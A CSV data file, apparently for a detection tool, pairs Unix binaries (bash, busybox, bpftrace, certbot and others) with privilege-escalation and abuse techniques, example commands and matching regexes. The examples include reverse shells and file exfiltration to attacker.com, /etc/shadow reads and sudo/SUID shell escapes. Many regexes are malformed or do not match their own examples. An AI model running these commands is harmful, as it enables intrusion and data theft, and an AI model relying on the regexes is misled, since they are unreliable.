Name,Function,ExampleCode,Regex,Notes
bash,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bash\s*\-c\s*\-i\s+(?:/dev/(?:tcp|udp)(?:/[^ \t\'""]*)?).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bash,file-upload,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
bash -c 'echo -e ""POST / HTTP/0.9\n\n$(<$LFILE)"" > /dev/tcp/$RHOST/$RPORT'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bash\s*\-c\s*\-e\s+(?:/dev/(?:tcp|udp)(?:/[^ \t\'""]*)?).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bash,file-upload,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
bash -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bash\s*\-c\s+(?:/dev/(?:tcp|udp)(?:/[^ \t\'""]*)?).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bash,file-download,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_get
bash -c '{ echo -ne ""GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n"" 1>&3; cat 0<&3; } \
3<>/dev/tcp/$RHOST/$RPORT \
| { while read -r; do [ ""$REPLY"" = ""$(echo -ne ""\r"")"" ] && break; done; cat; } > $LFILE'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bash\s*\-c\s*\-r\s+(?:/dev/(?:tcp|udp)(?:/[^ \t\'""]*)?).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bash,file-download,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_get
bash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bash\s*\-c\s+(?:/dev/(?:tcp|udp)(?:/[^ \t\'""]*)?).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bash,file-write,"export LFILE=file_to_write
bash -c 'echo DATA > $LFILE'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bash\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bash,file-write,"history -c
DATA
history -w $LFILE","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bash\s*\-c\s*\-w\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bash,file-read,"export LFILE=file_to_read
bash -c 'echo ""$(<$LFILE)""'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bash\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bash,file-read,"history -r $LFILE
history","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bash\s*\-r\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bash,library-load,bash -c 'enable -f ./lib.so x',(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bash\s*\-c\s*\-f\s+(?:-F\b|--form\b)),
bash,suid,./bash -p,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bash\s*\-p\s+.+),
bash,sudo,sudo bash,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bash\s+.+),
batcat,shell,"batcat --paging always /etc/profile
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?batcat\s*\-\-paging\s+(?:/bin/(?:sh|bash))),
batcat,limited-suid,"./batcat --paging always /etc/profile
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?batcat\s*\-\-paging\s+(?:/bin/(?:sh|bash))),
batcat,sudo,"sudo batcat --paging always /etc/profile
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?batcat\s*\-\-paging\s+(?:/bin/(?:sh|bash))),
bc,file-read,"bc -s $LFILE
quit","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bc\s*\-s\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bc,sudo,"sudo bc -s $LFILE
quit","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bc\s*\-s\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bc,suid,"./bc -s $LFILE
quit","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bc\s*\-s\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bconsole,shell,"bconsole
@exec /bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bconsole\s+(?:/bin/(?:sh|bash))),
bconsole,sudo,"sudo bconsole
@exec /bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bconsole\s+(?:/bin/(?:sh|bash))),
bconsole,file-read,bconsole -c /etc/shadow,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bconsole\s*\-c\s+.+),
bpftrace,sudo,"sudo bpftrace -e 'BEGIN {system(""/bin/sh"");exit()}'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bpftrace\s*\-e\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bpftrace,sudo,"echo 'BEGIN {system(""/bin/sh"");exit()}' >$TF
sudo bpftrace $TF","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bpftrace\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bpftrace,sudo,sudo bpftrace -c /bin/sh -e 'END {exit()}',"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bpftrace\s*\-c\s*\-e\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bridge,file-read,"bridge -b ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bridge\s*\-b\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bridge,suid,"./bridge -b ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bridge\s*\-b\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bridge,sudo,"sudo bridge -b ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bridge\s*\-b\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bundle,shell,"bundle help
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bundle\s+(?:/bin/(?:sh|bash))),
bundle,shell,"export BUNDLE_GEMFILE=x
bundle exec /bin/sh","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bundle\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bundle,shell,"touch $TF/Gemfile
cd $TF
bundle exec /bin/sh","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bundle\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bundle,shell,"touch $TF/Gemfile
cd $TF
bundle console
system('/bin/sh -c /bin/sh')","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bundle\s*\-c\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bundle,shell,"echo 'system(""/bin/sh"")' > $TF/Gemfile
cd $TF
bundle install","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bundle\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bundle,sudo,"sudo bundle help
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bundle\s+(?:/bin/(?:sh|bash))),
bundler,shell,"bundler help
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bundler\s+(?:/bin/(?:sh|bash))),
bundler,shell,"export BUNDLE_GEMFILE=x
bundler exec /bin/sh","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bundler\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bundler,shell,"touch $TF/Gemfile
cd $TF
bundler exec /bin/sh","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bundler\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bundler,shell,"touch $TF/Gemfile
cd $TF
bundler console
system('/bin/sh -c /bin/sh')","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bundler\s*\-c\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bundler,shell,"echo 'system(""/bin/sh"")' > $TF/Gemfile
cd $TF
bundler install","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bundler\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bundler,sudo,"sudo bundler help
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bundler\s+(?:/bin/(?:sh|bash))),
busctl,shell,"busctl --show-machine
!/bin/sh",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?busctl\s*\-\-show\-machine\s+(?:/bin/(?:sh|bash))),
busctl,shell,"busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?busctl\s*\-\-address\s*\-i\s+(?:/bin/(?:sh|bash))),
busctl,sudo,"sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?busctl\s*\-\-address\s*\-i\s+(?:/bin/(?:sh|bash))),
busctl,suid,"./busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?busctl\s*\-\-address\s*\-p\s*\-i\s+(?:/bin/(?:sh|bash))),
busybox,shell,busybox sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?busybox\s+.+),
busybox,file-upload,busybox httpd -f -p $LPORT -h .,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?busybox\s*\-f\s*\-p\s*\-h\s+(?:-F\b|--form\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
busybox,file-write,"busybox sh -c 'echo ""DATA"" > $LFILE'","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?busybox\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
busybox,file-read,"./busybox cat ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?busybox\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
busybox,suid,./busybox sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?busybox\s+.+),
busybox,sudo,sudo busybox sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?busybox\s+.+),
busybox,reverse-shell,busybox nc -e /bin/sh $RHOST $RPORT,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?busybox\s*\-e\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
byebug,shell,"echo 'system(""/bin/sh"")' > $TF
byebug $TF
continue","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?byebug\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
byebug,limited-suid,"echo 'system(""/bin/sh"")' > $TF
./byebug $TF
continue","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?byebug\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
byebug,sudo,"echo 'system(""/bin/sh"")' > $TF
sudo byebug $TF
continue","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?byebug\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bzip2,file-read,bzip2 -c $LFILE | bzip2 -d,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bzip2\s*\-c\s*\-d\s+(?:--data\b|--data-raw\b|-d\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bzip2,suid,./bzip2 -c $LFILE | bzip2 -d,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bzip2\s*\-c\s*\-d\s+(?:--data\b|--data-raw\b|-d\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bzip2,sudo,sudo bzip2 -c $LFILE | bzip2 -d,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?bzip2\s*\-c\s*\-d\s+(?:--data\b|--data-raw\b|-d\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
c89,file-read,"c89 -x c -E ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?c89\s*\-x\s*\-E\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
c89,file-write,c89 -xc /dev/null -o $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?c89\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
c89,shell,"c89 -wrapper /bin/sh,-s .",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?c89\s+(?:/bin/(?:sh|bash))),
c89,sudo,"sudo c89 -wrapper /bin/sh,-s .",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?c89\s+(?:/bin/(?:sh|bash))),
c99,file-read,"c99 -x c -E ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?c99\s*\-x\s*\-E\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
c99,file-write,c99 -xc /dev/null -o $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?c99\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
c99,shell,"c99 -wrapper /bin/sh,-s .",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?c99\s+(?:/bin/(?:sh|bash))),
c99,sudo,"sudo c99 -wrapper /bin/sh,-s .",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?c99\s+(?:/bin/(?:sh|bash))),
cabal,shell,cabal exec -- /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?cabal\s+(?:/bin/(?:sh|bash))),
cabal,suid,./cabal exec -- /bin/sh -p,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?cabal\s*\-p\s+(?:/bin/(?:sh|bash))),
cabal,sudo,sudo cabal exec -- /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?cabal\s+(?:/bin/(?:sh|bash))),
cancel,file-upload,"cancel -u ""$(cat $LFILE)"" -h $RHOST:$RPORT","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?cancel\s*\-u\s*\-h\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
capsh,shell,capsh --,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?capsh\s+.+),
capsh,suid,./capsh --gid=0 --uid=0 --,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?capsh\s*\-\-gid\s*\-\-uid\s+.+),
capsh,sudo,sudo capsh --,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?capsh\s+.+),
cat,file-read,"cat ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?cat\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
cat,suid,"./cat ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?cat\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
cat,sudo,"sudo cat ""$LFILE""","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?cat\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
cdist,shell,cdist shell -s /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?cdist\s*\-s\s+(?:/bin/(?:sh|bash))),
cdist,sudo,sudo cdist shell -s /bin/sh,(?:?i)(?:(?:sudo\s+)?(?:\S*/)?cdist\s*\-s\s+(?:/bin/(?:sh|bash))),
certbot,shell,certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0',"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?certbot\s*\-n\s*\-d\s*\-\-standalone\s*\-\-dry\-run\s*\-\-agree\-tos\s*\-\-email\s*\-\-logs\-dir\s*\-\-work\-dir\s*\-\-config\-dir\s*\-\-pre\-hook\s+(?:/bin/(?:sh|bash)).*(?:--data\b|--data-raw\b|-d\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
certbot,sudo,sudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0',"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?certbot\s*\-n\s*\-d\s*\-\-standalone\s*\-\-dry\-run\s*\-\-agree\-tos\s*\-\-email\s*\-\-logs\-dir\s*\-\-work\-dir\s*\-\-config\-dir\s*\-\-pre\-hook\s+(?:/bin/(?:sh|bash)).*(?:--data\b|--data-raw\b|-d\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
check_by_ssh,shell,"check_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C xx",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?check_by_ssh\s*\-o\s*\-i\s*\-H\s*\-C\s+(?:/bin/(?:sh|bash))),
check_by_ssh,sudo,"sudo check_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C xx",(?:?i)(?:(?:sudo\s+)?(?:\S*/)?check_by_ssh\s*\-o\s*\-i\s*\-H\s*\-C\s+(?:/bin/(?:sh|bash))),
check_cups,file-read,check_cups --extra-opts=@$LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?check_cups\s*\-\-extra\-opts\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
check_cups,sudo,sudo check_cups --extra-opts=@$LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?check_cups\s*\-\-extra\-opts\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
check_log,file-read,"check_log -F $LFILE -O $OUTPUT
cat $OUTPUT","(?:?i)(?:(?:sudo\s+)?(?:\S*/)?check_log\s*\-F\s*\-O\s+(?:-F\b|--form\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
check_log,file-write,check_log -F $INPUT -O $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?check_log\s*\-F\s*\-O\s+(?:-F\b|--form\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
check_log,sudo,sudo check_log -F $INPUT -O $LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?check_log\s*\-F\s*\-O\s+(?:-F\b|--form\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
check_memory,file-read,check_memory --extra-opts=@$LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?check_memory\s*\-\-extra\-opts\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
check_memory,sudo,sudo check_memory --extra-opts=@$LFILE,"(?:?i)(?:(?:sudo\s+)?(?:\S*/)?check_memory\s*\-\-extra\-opts\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
